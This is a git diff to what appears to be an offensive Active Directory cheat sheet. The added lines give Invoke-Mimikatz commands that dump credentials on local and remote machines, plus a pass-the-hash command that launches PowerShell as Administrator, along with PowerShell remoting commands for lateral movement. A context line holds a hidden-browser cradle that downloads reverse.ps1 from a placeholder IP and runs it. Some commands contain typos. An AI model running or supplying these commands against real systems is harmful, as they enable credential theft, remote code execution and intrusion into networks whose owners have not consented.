@@ -153,6 +153,12 @@ shell
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## KIWI, MIMIKATZ
 
+Mimikatz PowerShell Script
+
+1) Invoke-Mimikatz -DumpCreds
+2) Invoke-Mimikatz -DumpCreds -ComputerName@("comp1","comp2")
+3) Pass-the-hash attack: Invoke-Mimikatz -Command "securlsa::pth /user:Administrator /domain:<domain> /hash:<hash> /run:powershell.exe"
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## GOLDEN/SILVER TICKET
 
@@ -165,8 +171,15 @@ shell
 5) $ie=Nwe-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://ip/reverse.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 PowerShell-Remoting 
+
 Enter-PSSession -ComputerName <computername> -Credentials <domain>\username
-Invoke-Commands -ScriptBlock {whoami;hostname} -ComputerName <computername> -Credentials <domain>\username
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <computername> -Credentials <domain>\username
+
+$session = New-PSSession -ComputerName <computer name> -verbose
+Enter-PSSession -Session $session -Verbose
+Invoke-Command -Session $session -ScriptBlock {whoami;hostname} -Verbose
+
+
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Unconstrained delegation
 
